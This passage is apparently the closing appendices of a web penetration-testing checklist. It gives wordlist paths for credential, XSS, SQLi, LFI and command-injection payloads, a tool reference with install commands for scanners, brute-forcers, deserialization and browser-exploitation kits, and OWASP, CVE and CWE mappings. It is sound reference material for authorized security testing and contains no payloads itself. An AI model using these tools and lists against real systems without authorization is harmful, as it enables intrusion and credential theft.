| **default-passwords.csv** | [DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv) | 4,000+ | Vendor default creds |
| **cirt-default-passwords** | `/usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv` | 850 | CIRT default creds |
| **tomcat-betterdefaultpasslist** | `/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt` | 56 | Tomcat defaults |

### A.3 Usernames

| Wordlist | Path / Download | Entries | Best For |
|---|---|---|---|
| **top-usernames-shortlist** | `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` | 17 | Quick username spray |
| **xato-net-10-million-usernames** | `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` | 10,000,000 | Comprehensive username brute |
| **names.txt** | `/usr/share/seclists/Usernames/Names/names.txt` | 10,163 | Real name list |
| **CommonAdminBase64** | `/usr/share/seclists/Usernames/CommonAdminBase64.txt` | 50 | Common admin usernames |

### A.4 Fuzzing / Injection Payloads

| Wordlist | Path / Download | Entries | Best For |
|---|---|---|---|
| **XSS-Jhaddix** | `/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt` | 3,857 | Comprehensive XSS payloads |
| **XSS-Bypass-Strings-BruteLogic** | `/usr/share/seclists/Fuzzing/XSS/XSS-bypass-strings-by-BruteLogic.txt` | 3,319 | Filter-bypass XSS |
| **XSS-DOM** | `/usr/share/seclists/Fuzzing/XSS/XSS-DOM-PortSwigger.txt` | 84 | DOM XSS payloads |
| **LFI-Jhaddix** | `/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt` | 922 | LFI / path traversal |
| **LFI-gracefulsecurity-linux** | `/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt` | 257 | Linux LFI targets |
| **LFI-gracefulsecurity-windows** | `/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt` | 117 | Windows LFI targets |
| **SQLi-Jhaddix** | `/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt` | 947 | SQLi detection |
| **SQLi-MSSQL** | `/usr/share/seclists/Fuzzing/SQLi/Polyglots.txt` | 507 | SQLi polyglots |
| **FUZZ-Bo0oM** | `/usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt` | 3,495 | Multi-vulnerability fuzzing |
| **big-list-of-naughty-strings** | [BLNS](https://github.com/minimaxir/big-list-of-naughty-strings/blob/master/blns.txt) | 550 | Edge cases & special chars |
| **command-injection** | `/usr/share/seclists/Fuzzing/command-injection-commix.txt` | 7,683 | OS command injection |
| **SSTI-payloads** | [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) | Various | Template injection |

### A.5 Subdomain & DNS

| Wordlist | Path / Download | Entries | Best For |
|---|---|---|---|
| **subdomains-top1million-5000** | `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` | 5,000 | Fast subdomain brute |
| **subdomains-top1million-20000** | `/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt` | 20,000 | Balanced |
| **subdomains-top1million-110000** | `/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt` | 114,532 | Thorough |
| **dns-Jhaddix** | `/usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt` | 6,282,261 | Deep DNS brute |
| **fierce-hostlist** | `/usr/share/seclists/Discovery/DNS/fierce-hostlist.txt` | 1,594 | Fierce tool |

### A.6 Download Links

| Resource | URL |
|---|---|
| SecLists (master repository) | https://github.com/danielmiessler/SecLists |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| FuzzDB | https://github.com/fuzzdb-project/fuzzdb |
| RobotsDisallowed | https://github.com/danielmiessler/RobotsDisallowed |
| DefaultCreds Cheat Sheet | https://github.com/ihebski/DefaultCreds-cheat-sheet |
| Assetnote Wordlists | https://wordlists.assetnote.io/ |
| Rockyou2021 (82GB) | https://github.com/ohmybahgosh/RockYou2021.txt |

---

## Appendix B — Tool Reference

| Tool | Purpose | Install | URL |
|---|---|---|---|
| **Burp Suite Pro** | Proxy, scanner, intruder | Download | https://portswigger.net/burp |
| **OWASP ZAP** | Proxy, active scanner (free) | `snap install zaproxy` | https://zaproxy.org |
| **Nmap** | Port scanning | `apt install nmap` | https://nmap.org |
| **ffuf** | Fast web fuzzer | `apt install ffuf` | https://github.com/ffuf/ffuf |
| **Gobuster** | Dir/DNS brute force | `apt install gobuster` | https://github.com/OJ/gobuster |
| **Feroxbuster** | Recursive content discovery | `apt install feroxbuster` | https://github.com/epi052/feroxbuster |
| **sqlmap** | SQL injection automation | `apt install sqlmap` | https://sqlmap.org |
| **Nikto** | Web vulnerability scanner | `apt install nikto` | https://cirt.net/Nikto2 |
| **Nuclei** | Template-based scanner | `apt install nuclei` | https://github.com/projectdiscovery/nuclei |
| **testssl.sh** | SSL/TLS analysis | `git clone` | https://github.com/drwetter/testssl.sh |
| **sslscan** | SSL/TLS scanner | `apt install sslscan` | https://github.com/rbsec/sslscan |
| **Hydra** | Credential brute force | `apt install hydra` | https://github.com/vanhauser-thc/thc-hydra |
| **Medusa** | Credential brute force | `apt install medusa` | https://github.com/jmk-foofus/medusa |
| **Subfinder** | Subdomain discovery | Binary release | https://github.com/projectdiscovery/subfinder |
| **Amass** | Attack surface mapping | `apt install amass` | https://github.com/owasp-amass/amass |
| **HTTPX** | HTTP probe/fingerprint | Binary release | https://github.com/projectdiscovery/httpx |
| **Dalfox** | XSS scanner | Binary release | https://github.com/hahwul/dalfox |
| **XSStrike** | Advanced XSS tool | `git clone` | https://github.com/s0md3v/XSStrike |
| **ysoserial** | Java deserialization payloads | JAR download | https://github.com/frohoff/ysoserial |
| **PHPGGC** | PHP gadget chains | `git clone` | https://github.com/ambionics/phpggc |
| **tplmap** | SSTI exploitation | `git clone` | https://github.com/epinna/tplmap |
| **Commix** | Command injection | `git clone` | https://github.com/commixproject/commix |
| **wafw00f** | WAF detection | `pip install wafw00f` | https://github.com/EnableSecurity/wafw00f |
| **WPScan** | WordPress scanner | `gem install wpscan` | https://wpscan.com |
| **dotdotpwn** | Path traversal fuzzer | `apt install dotdotpwn` | https://github.com/wireghoul/dotdotpwn |
| **interactsh** | OOB detection server | Binary release | https://github.com/projectdiscovery/interactsh |
| **BBOT** | Attack surface discovery | `pip install bbot` | https://github.com/blacklanternsecurity/bbot |
| **Katana** | Web crawler | Binary release | https://github.com/projectdiscovery/katana |
| **GAU** | GetAllURLs | Binary release | https://github.com/lc/gau |
| **Waybackurls** | Wayback Machine URLs | `go install` | https://github.com/tomnomnom/waybackurls |
| **BeEF** | Browser exploitation | `apt install beef-xss` | https://beefproject.com |

---

## Appendix C — Vulnerability Mapping Reference

### C.1 OWASP Top 10 (2021) Mapping

| OWASP ID | Category | Covered In |
|---|---|---|
| A01:2021 | Broken Access Control | Phase 11 (IDOR, Verb Tampering), Phase 8 (Path Traversal) |
| A02:2021 | Cryptographic Failures | Phase 4 (TLS), Phase 5 (Auth) |
| A03:2021 | Injection | Phase 7 (XSS), Phase 8 (SQLi), Phase 13 (Command Injection, SSTI) |
| A04:2021 | Insecure Design | Phase 14 (Business Logic) |
| A05:2021 | Security Misconfiguration | Phase 3 (Headers), Phase 4 (TLS), Phase 9 (Default Creds) |
| A06:2021 | Vulnerable and Outdated Components | Phase 2 (Fingerprinting), Phase 12 (Shellshock, Log4Shell) |
| A07:2021 | Identification and Authentication Failures | Phase 6 (Auth/Session), Phase 9 (Brute Force) |
| A08:2021 | Software and Data Integrity Failures | Phase 13 (Deserialization) |
| A09:2021 | Security Logging and Monitoring Failures | Phase 1 & 2 |
| A10:2021 | Server-Side Request Forgery | Phase 12 (SSRF) |

### C.2 Key CVE Reference

| CVE | Vulnerability | CVSS | Affected Software |
|---|---|---|---|
| CVE-2014-6271 | Shellshock | 10.0 | Bash < 4.3 patch 25 |
| CVE-2014-0160 | Heartbleed | 7.5 | OpenSSL 1.0.1 – 1.0.1f |
| CVE-2014-3566 | POODLE | 3.4 | SSLv3 |
| CVE-2015-4000 | LOGJAM | 3.7 | DHE < 1024-bit |
| CVE-2016-2183 | SWEET32 | 7.5 | 3DES, Blowfish |
| CVE-2021-44228 | Log4Shell | 10.0 | Log4j2 < 2.15.0 |
| CVE-2021-41773 | Apache Path Traversal | 7.5 | Apache HTTPD 2.4.49 |
| CVE-2021-42013 | Apache Path Traversal 2 | 9.8 | Apache HTTPD 2.4.50 |
| CVE-2019-2725 | WebLogic RCE Deserialization | 9.8 | Oracle WebLogic |
| CVE-2017-5638 | Apache Struts RCE | 10.0 | Struts 2.3.x / 2.5.x |
| CVE-2015-4852 | WebLogic Deserialization | 9.8 | Oracle WebLogic |
| CVE-2016-4437 | Apache Shiro Deserialization | 9.8 | Shiro < 1.2.5 |
| CVE-2012-2660 | Rails Mass Assignment | 5.0 | Ruby on Rails |
| CVE-2022-22720 | Apache HTTP Smuggling | 8.0 | Apache HTTPD 2.4.52 |

### C.3 CWE Quick Reference

| CWE | Name | Relevant To |
|---|---|---|
| CWE-22 | Path Traversal | Phase 8 |
| CWE-78 | OS Command Injection | Phase 12 |
| CWE-79 | Cross-Site Scripting | Phase 7 |
| CWE-89 | SQL Injection | Phase 8 |
| CWE-98 | Remote File Inclusion | Phase 8 |
| CWE-200 | Information Exposure | Phase 2, 3 |
| CWE-295 | Improper Certificate Validation | Phase 4 |
| CWE-307 | Improper Restriction of Attempts | Phase 9 |
| CWE-311 | Missing Encryption | Phase 4 |
| CWE-319 | Cleartext Transmission | Phase 4 |
| CWE-326 | Inadequate Encryption Strength | Phase 4 |
| CWE-327 | Use of Broken Algorithm | Phase 4 |
| CWE-330 | Insufficient Randomness | Phase 6 |
| CWE-347 | Improper JWT Verification | Phase 6 |
| CWE-352 | CSRF | Phase 6 |
| CWE-384 | Session Fixation | Phase 6 |
| CWE-444 | HTTP Request Smuggling | Phase 10 |
| CWE-502 | Deserialization of Untrusted Data | Phase 13 |
| CWE-521 | Weak Password Requirements | Phase 9 |
| CWE-614 | Insecure Cookie Flags | Phase 6 |
| CWE-639 | IDOR | Phase 11 |
| CWE-650 | Verb Tampering | Phase 11 |
| CWE-693 | Protection Mechanism Failure (CSP) | Phase 3 |
| CWE-915 | Mass Assignment | Phase 11 |
| CWE-917 | Expression Language Injection | Phase 12 |
| CWE-918 | SSRF | Phase 12 |
| CWE-1021 | Clickjacking | Phase 3 |
| CWE-1392 | Default Credentials | Phase 9 |

### C.4 Exploit-DB Quick Reference

| EDB-ID | Title | Phase |
|---|---|---|
| EDB-34765 | Shellshock Bash RCE | Phase 12 |
| EDB-50383 | Apache 2.4.49 Path Traversal RCE | Phase 8 |
| EDB-43459 | WebLogic Java Deserialization | Phase 13 |
| EDB-49820 | WordPress Stored XSS | Phase 7 |
| EDB-50272 | Blind SQLi via Time-Based | Phase 8 |
| EDB-50512 | HTTP Request Smuggling CL.TE | Phase 10 |

> Search Exploit-DB: https://www.exploit-db.com/
> Offline search: `searchsploit <keyword>`

---

## 📚 Additional References & Resources

### Standards & Frameworks
- [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Top 10 (2021)](https://owasp.org/Top10/)
- [PTES Technical Guidelines](http://www.pentest-standard.org/)
- [NIST SP 800-115](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf)

### Learning Platforms
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — Free labs for all topics
- [HackTricks Web Vulnerabilities](https://book.hacktricks.xyz/pentesting-web/web-vulnerabilities-methodology)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

### Vulnerability Databases
- [National Vulnerability Database (NVD)](https://nvd.nist.gov/)
- [Exploit-DB](https://www.exploit-db.com/)
- [CVE Details](https://www.cvedetails.com/)
- [Vulhub](https://github.com/vulhub/vulhub) — Docker PoC environments

### Bug Bounty Reports (for real-world context)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)
- [Bugcrowd Disclosure](https://bugcrowd.com/disclosures)
- [Pentester Land Write-up Compilation](https://pentester.land/writeups)

---

*Checklist authored for professional use. Always test with explicit written authorization. Unauthorized testing is illegal and unethical.*


